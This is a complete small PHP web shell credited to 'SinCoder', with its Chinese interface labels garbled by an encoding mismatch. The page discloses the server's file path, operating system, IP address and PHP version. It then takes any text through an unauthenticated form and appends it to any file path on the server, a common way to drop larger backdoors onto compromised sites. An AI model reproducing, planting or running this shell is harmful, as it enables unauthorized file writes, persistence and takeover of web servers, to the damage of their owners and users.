<html>
<title >By: SinCoder</title>
 <font color=red size=6>phpС�� By:SinCoder</br></font>
 <? echo "</br>�������·��: ".__FILE__.
         "</br>����������ϵͳ: ".PHP_OS.
         "</br>������IP��ַ: ".gethostbyname($_SERVER["SERVER_NAME"]).
      "</br>PHP�汾: ".PHP_VERSION;
?>
 <form action = <? echo strrchr(__FILE__,"\\"); ?> method="post">
 Ҫ�ύ�����ݣ�</br>
 <textarea type="text" name="data" rows="10" cols="30">
 </textarea>
 </br>
 ����·����<input type="text" name="dir" />
 </br>
 <input type="submit" value="�ύ"/>
 </form>
</html>

<?
 if(!(isset($_POST["data"]) && isset($_POST["dir"])))
     exit();
   
 if(strlen($_POST["data"])>0 && strlen($_POST["dir"])>0)
  {
   $p_File=fopen($_POST["dir"],"a");
   if(!$p_File)
     echo "д��ʧ�ܣ��뻻��Ŀ¼���ԣ�";
   else 
     echo "Ok����                     ";
   fputs($p_File,$_POST["data"]);
   fclose($p_File);
  }
 else
   echo "���������д������";
?>

